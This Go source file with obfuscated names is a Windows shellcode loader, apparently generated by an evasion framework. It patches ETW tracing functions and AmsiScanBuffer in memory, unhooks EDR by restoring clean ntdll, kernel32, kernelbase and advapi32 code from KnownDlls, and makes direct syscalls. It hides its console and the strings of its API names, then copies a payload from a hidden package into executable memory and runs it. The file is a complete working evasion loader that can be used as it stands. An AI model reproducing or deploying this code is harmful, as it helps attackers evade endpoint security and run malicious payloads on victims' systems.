
	
	package main

	
	

	import (
		filepe "debug/pe"
		"encoding/base64"
		"encoding/hex"
		
		"glXXPyloxooRSteO/glXXPyloxooRSteO"
		"strconv"
		"fmt"
		"syscall"
		"unsafe"
		"time"
		


		"golang.org/x/sys/windows"
		"golang.org/x/sys/windows/registry"
		"github.com/Binject/debug/pe"
		"github.com/awgh/rawreader"
	)
	


	const (
		ATLbMV= 0x1F0FFF
	)
	var _ unsafe.Pointer
	var (
		sZhSNaBJ uint16
		SkaXAsD uint16
		qDIAddYO int = 4
	)

	
	
	
	
	func sxKls() string {
		iABVqm, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
		ybHUpMNZ, _, _ :=  iABVqm.GetStringValue("CurrentVersion")
		LHbE, _, err := iABVqm.GetIntegerValue("CurrentMajorVersionNumber")
		if err == nil{
			//SBkLYTc, _, _ := iABVqm.GetIntegerValue("CurrentMinorVersionNumber")
			ybHUpMNZ = strconv.FormatUint(LHbE, 10)
		}
		defer iABVqm.Close()
		if ybHUpMNZ == "10" {
			sZhSNaBJ = 0x18
			SkaXAsD = 0x50
		} else if ybHUpMNZ == "6.3" {
			sZhSNaBJ = 0x17
			SkaXAsD = 0x4f
		} else if ybHUpMNZ == "6.2" {
			sZhSNaBJ = 0x16
			SkaXAsD = 0x4e
		} else if ybHUpMNZ == "6.1" {
			sZhSNaBJ = 0x15
			SkaXAsD= 0x4d
		}
		return ybHUpMNZ 

	}

	func kKgI(uHpVd string,) string {
		var owcIg []byte
			owcIg, _ = base64.StdEncoding.DecodeString(uHpVd)
		lYQmcSsj := 1
		for i := 1; i < qDIAddYO; i++ {
			owcIg, _ = base64.StdEncoding.DecodeString(string(owcIg))
			lYQmcSsj += i
		}
		return string(owcIg)
	
	}

	

	func mQMmblJwzrnwhTpNVF(show bool) {
		pPjEUAzmAulBV := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(kKgI("VldwS1YwMUdSWGxQV0ZacVRXcHNlbGRzV210alIwcDBWVzVhYTJSNk1Eaz0="))
		JXKZycUUWdXOSxH := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc(kKgI("VmxSS2IyUnRVWGhhU0VKcFlsWktNbHBJWXpsUVVUMDk="))
		vxjvabVfDf, _, _ := pPjEUAzmAulBV.Call()
		if vxjvabVfDf == 0 {
			return
		}
		if show {
		var FkfrPqaoQbdo uintptr = 9
		JXKZycUUWdXOSxH.Call(vxjvabVfDf, FkfrPqaoQbdo)
		} else {
		var nAChNEkdHNcwLZc uintptr = 0
		JXKZycUUWdXOSxH.Call(vxjvabVfDf, nAChNEkdHNcwLZc)
		}
	}



	
	const (
		TkLKQKBk= 997
	)
	var AJGSkVuq error = syscall.Errno(TkLKQKBk)
	var BJlf = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(kKgI("Vm1wT1MyTkhVa2hXYkVacVlsUnNjVmRzYUU5bGJGSllWbTVTYVUwd2J6RT0="))


	func bBPRKS(wAIp uintptr, qdYzFlBm uintptr, QQaET *byte, Nsrqkro uintptr, sfeKZp *uintptr) (err error) {
		r1, _, e1 := syscall.Syscall6(BJlf.Addr(), 5, uintptr(wAIp), uintptr(qdYzFlBm), uintptr(unsafe.Pointer(QQaET)), uintptr(Nsrqkro), uintptr(unsafe.Pointer(sfeKZp)), 0)
		if r1 == 0 {
			if e1 != 0 {
				err = IKDOlHKT(e1)
			} else {
				err = syscall.EINVAL
			}
		}
		return
	}

	func IKDOlHKT(e syscall.Errno) error {
		switch e {
		case 0:
			return nil
		case TkLKQKBk:
			return AJGSkVuq
		}
	
		return e
	}
	

	
	var gLCyAH = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(kKgI("Vld4b1UwMHhVblJQVkVKb1ZqRndkMWRVU2tkTlIwWllUMWhXVm1KV1duVlpWbWhQVFVad1dWTlVNRDA9"))
	var MDMEkWj = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(kKgI("Vld4b1UwMHhTbGxYYlhocFlteEtWRmRzWkd0alIwMTZWVzE0YWxwNk1Eaz0="))
	var pjmZpOJy = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(kKgI("Vld4b1UwMHhTbGxYYlhocFlteEtXVmt5TVhOTlJuQldWMnBHYVZJell6az0="))
	var jwWvP = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(kKgI("Vld4b1UwMHhTbGxYYlhocFlteEtXVmt5TVhOTlJuQlNVRlF3UFE9PQ=="))

	func ojsaUYLG() {
		BSQsyI := uintptr(0xffffffffffffffff)
		rgGSH := []uintptr{ gLCyAH.Addr(), MDMEkWj.Addr(), pjmZpOJy.Addr(), jwWvP.Addr()}
		for i, _ := range rgGSH {
			znlUe, _ := hex.DecodeString("4833C0C3")
			var PwiS uintptr
			WpSjJL := len(znlUe)
			bBPRKS(BSQsyI, rgGSH[i], &znlUe[0], uintptr(uint32(WpSjJL)), &PwiS)
		}
	}

	func yugkJ(BSQsyI windows.Handle) {
		rgGSH := []uintptr{ gLCyAH.Addr(), MDMEkWj.Addr(), pjmZpOJy.Addr(), jwWvP.Addr()}
		for i, _ := range rgGSH {
			znlUe, _ := hex.DecodeString("4833C0C3")
			var PwiS uintptr
			WpSjJL := len(znlUe)
			bBPRKS(uintptr(BSQsyI), rgGSH[i], &znlUe[0], uintptr(uint32(WpSjJL)), &PwiS)
		}
	}



	
	func suLBEYO() {
		var BQggUyBE uint64
		BQggUyBE = 0xffffffffffffffff
		wUOsjHIv, _ := windows.LoadLibrary(string([]byte{'a','m','s','i','.','d','l','l'}))
		HmtmPSgO, _ := windows.GetProcAddress(wUOsjHIv, string([]byte{'a','m','s','i','S','c','a','n','B','u','f','f','e','r'}))
		UUDPj, _ :=  hex.DecodeString("B857000780C3")
		var tuVwVHX uintptr
		zkOpiObv := len(UUDPj)
		bBPRKS(uintptr(BQggUyBE), uintptr(uint(HmtmPSgO)), &UUDPj[0], uintptr(uint32(zkOpiObv)), &tuVwVHX)
	}
	

	var procReadProcessMemory = syscall.NewLazyDLL("kernel32.dll").NewProc("ReadProcessMemory")

	func kvpN() uintptr {
		var funcNtAllocateVirtualMemory = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc("NtAllocateVirtualMemory")
		handle := uintptr(0xffffffffffffffff)
		num := 2
		var add uintptr
		AllAddr := funcNtAllocateVirtualMemory.Addr()
		for i := 0; i < 20; i++ {
			rawr, _, _ := ReadProcessMemory(handle, AllAddr+uintptr(i), uintptr(num))
			f := fmt.Sprintf("%0x", rawr)
			if f == "0f05" {
				add = AllAddr + uintptr(i)
				return add
			}
		}
		return add
	}

	func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, nSize uintptr) (lpBuffer []uint8, lpNumberOfBytesRead int, ok bool) {
		var nBytesRead int
		buf := make([]uint8, nSize)
		ret, _, _ := procReadProcessMemory.Call(
			uintptr(hProcess),
			lpBaseAddress,
			uintptr(unsafe.Pointer(&buf[0])),
			nSize,
			uintptr(unsafe.Pointer(&nBytesRead)),
		)
	
		return buf, nBytesRead, ret != 0
	}
	
		

	func main() {
		
		ojsaUYLG()
		suLBEYO()
		time.Sleep(2748 * time.Millisecond)
		ybHUpMNZ := sxKls()
		
		if ybHUpMNZ == "10" {
			HkpNDVjYdAVaI()
		}
		ojsaUYLG()
		mQMmblJwzrnwhTpNVF(false)
		GdXVRyKtEwuKavgm := glXXPyloxooRSteO.RPWkYKTDkSrA()
		CGcABtbMWHQm(GdXVRyKtEwuKavgm)
	}

	
	func CGcABtbMWHQm(GdXVRyKtEwuKavgm []byte){
		QAicTEfJFRsd := windows.NewLazySystemDLL("ntdll.dll")
		agcsgBGcZGLMxQS := windows.NewLazySystemDLL("kernel32")
		NiCCgHtXHBD := QAicTEfJFRsd.NewProc("RtlCopyMemory")
		DOmsdWaDjgJawYljRx := agcsgBGcZGLMxQS.NewProc("VirtualAlloc")

		var lKBLZXdpzOewHRZdBZ, CbtwIoqNJT uintptr
		var vxTlDSJZyAYQhIC uintptr
		KuGbCblLTxL := uintptr(0xffffffffffffffff)
		rJHWhnigBjbaQv := uintptr(len(GdXVRyKtEwuKavgm))
		CbtwIoqNJT = 0x40
		lKBLZXdpzOewHRZdBZ = 0x3000
		yksVbCtAxm, _, _ := DOmsdWaDjgJawYljRx.Call(0, uintptr(len(GdXVRyKtEwuKavgm)), lKBLZXdpzOewHRZdBZ, CbtwIoqNJT)

		
		NiCCgHtXHBD.Call(yksVbCtAxm, (uintptr)(unsafe.Pointer(&GdXVRyKtEwuKavgm[0])), uintptr(len(GdXVRyKtEwuKavgm)))
		
		


		glXXPyloxooRSteO.UzWUYzGqoaKlR(
			SkaXAsD, 
			KuGbCblLTxL,
			(*uintptr)(unsafe.Pointer(&yksVbCtAxm)),
			&rJHWhnigBjbaQv,
			0x20,
			&vxTlDSJZyAYQhIC,
			)
		
		syscall.Syscall(yksVbCtAxm, 0, 0, 0, 0)
	}


	
	
		var bOpcvzVVwfLbIBBc      uint16
		var kzYXVDoAtDRjMsNH uint16
		var YORaBEtUuqQgXQhds      uint16
		func HkpNDVjYdAVaI()  {
			wxZxeENWHIIOuONql := []string{string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}),
			string([]byte{'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'})}
		
	 	for i, _ := range wxZxeENWHIIOuONql {
			KnownDLL(wxZxeENWHIIOuONql[i])
			}
		}

		var procNtOpenSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtOpenSection")
		var procNtMapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtMapViewOfSection")
		var procNtUnmapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtUnmapViewOfSection")

		type sstring struct {
			PWstr *uint16
		}
	
		func (s sstring) String() string {
			return windows.UTF16PtrToString(s.PWstr)
		}
	
		func KnownDLL(sYGeHQzBmrYZAFdK  string) []byte {
			
			var CWvDdtqorzj , MTPaQGowlFPlXDkMX , hHzklHqpfHjsIdJ  uintptr
			TLnjqUBXwxwm := uintptr(0xffffffffffffffff)
			dFZJWSCdjGLkPmRt := "\\" + string([]byte{'K', 'n', 'o', 'w', 'n', 'D', 'l', 'l', 's'}) + "\\" + sYGeHQzBmrYZAFdK 
			LWeLPBNbAHQoVE, _ := windows.NewNTUnicodeString(dFZJWSCdjGLkPmRt)
			gtQjvjGrjpjqQb := windows.OBJECT_ATTRIBUTES{}
			gtQjvjGrjpjqQb.Attributes = 0x00000040
			gtQjvjGrjpjqQb.ObjectName = LWeLPBNbAHQoVE
			gtQjvjGrjpjqQb.Length = uint32(unsafe.Sizeof(windows.OBJECT_ATTRIBUTES{}))
			NyenOUwSSAhTbnjvMU := kvpN()
			bOpcvzVVwfLbIBBc = 0x37
			JvXygPUCDwpChdEg := 0x0004
			r, _ := glXXPyloxooRSteO.DALmNwjfLqWtxQSVuG(
				bOpcvzVVwfLbIBBc, 
				NyenOUwSSAhTbnjvMU, 
				uintptr(unsafe.Pointer(&CWvDdtqorzj)), 
				uintptr(JvXygPUCDwpChdEg), 
				uintptr(unsafe.Pointer(&gtQjvjGrjpjqQb)),
			)
			if r != 0 {
			}
			kzYXVDoAtDRjMsNH = 0x28
			zero := 0
			one := 1
			glXXPyloxooRSteO.LIBdDnTEPkkAJoRrc(
				kzYXVDoAtDRjMsNH, 
				NyenOUwSSAhTbnjvMU, 
				CWvDdtqorzj, 
				TLnjqUBXwxwm, 
				uintptr(unsafe.Pointer(&hHzklHqpfHjsIdJ)), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(unsafe.Pointer(&MTPaQGowlFPlXDkMX)), 
				uintptr(one), 
				uintptr(zero), 
				uintptr(syscall.PAGE_READONLY),
			)
			ihuXcxDGTsVCGVUpal := rawreader.New(hHzklHqpfHjsIdJ, int(MTPaQGowlFPlXDkMX))
			eQTKiXbRqI, _ := pe.NewFileFromMemory(ihuXcxDGTsVCGVUpal)
			JXFTynHgPpQyzoip, err := eQTKiXbRqI.Bytes()
			if err != nil {
			}
			ODBWTyvrIB := eQTKiXbRqI.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
			bkNFIsXaqDtvtNA := JXFTynHgPpQyzoip[ODBWTyvrIB.Offset:ODBWTyvrIB.Size]
			kCmozobOEI, error := filepe.Open(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  sYGeHQzBmrYZAFdK )
			if error != nil {
			}
			jnMTugoDCbJkIfh := kCmozobOEI.Section(".text")
			UiLIMsoUGLOAHCTeg, error := windows.LoadDLL(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  sYGeHQzBmrYZAFdK )
			if error != nil {
			}
			eBZYfvYquEsWaXvOSi := UiLIMsoUGLOAHCTeg.Handle
			SyAZZVsuAtmNdExZ  := uintptr(eBZYfvYquEsWaXvOSi)
			zcccrnfGBrz := uint(SyAZZVsuAtmNdExZ) + uint(jnMTugoDCbJkIfh.VirtualAddress)
			YORaBEtUuqQgXQhds = 0x50
			VrvEAVuTyqpddHnzH := uintptr(len(bkNFIsXaqDtvtNA))
			var XGpFoVvBOaR uintptr

			xTVrQRfgtIchNaQf, _ := glXXPyloxooRSteO.YOCeqmCbbyPBmRzmcy(
				YORaBEtUuqQgXQhds, 
				NyenOUwSSAhTbnjvMU, 
				TLnjqUBXwxwm, 
				(*uintptr)(unsafe.Pointer(&zcccrnfGBrz)), 
				&VrvEAVuTyqpddHnzH, 
				0x40, 
				&XGpFoVvBOaR,
			)
			if xTVrQRfgtIchNaQf != 0 {
			}
			rarHpvBLyOP(bkNFIsXaqDtvtNA, uintptr(zcccrnfGBrz))
			kCmozobOEI.Close()
			xTVrQRfgtIchNaQf, _ = glXXPyloxooRSteO.YOCeqmCbbyPBmRzmcy(
				YORaBEtUuqQgXQhds, 
				NyenOUwSSAhTbnjvMU, 
				TLnjqUBXwxwm, 
				(*uintptr)(unsafe.Pointer(&zcccrnfGBrz)), 
				&VrvEAVuTyqpddHnzH, 
				0x20, 
				&XGpFoVvBOaR,
			)
			if xTVrQRfgtIchNaQf != 0 {
			}
			syscall.Syscall(uintptr(procNtUnmapViewOfSection.Addr()), 2, uintptr(TLnjqUBXwxwm), hHzklHqpfHjsIdJ, 0)
			return bkNFIsXaqDtvtNA
		}


		func rarHpvBLyOP(NsXZCPvXqYZcIg []byte, mrTTplrJjqKX uintptr) {
			for gZDumAclbnjd := uint32(0); gZDumAclbnjd < uint32(len(NsXZCPvXqYZcIg)); gZDumAclbnjd++ {
				UDfoFgtbzGem := unsafe.Pointer(mrTTplrJjqKX + uintptr(gZDumAclbnjd))
				OGyFoZPiEUULY := (*byte)(UDfoFgtbzGem)
				*OGyFoZPiEUULY = NsXZCPvXqYZcIg[gZDumAclbnjd]
			}
		}

	
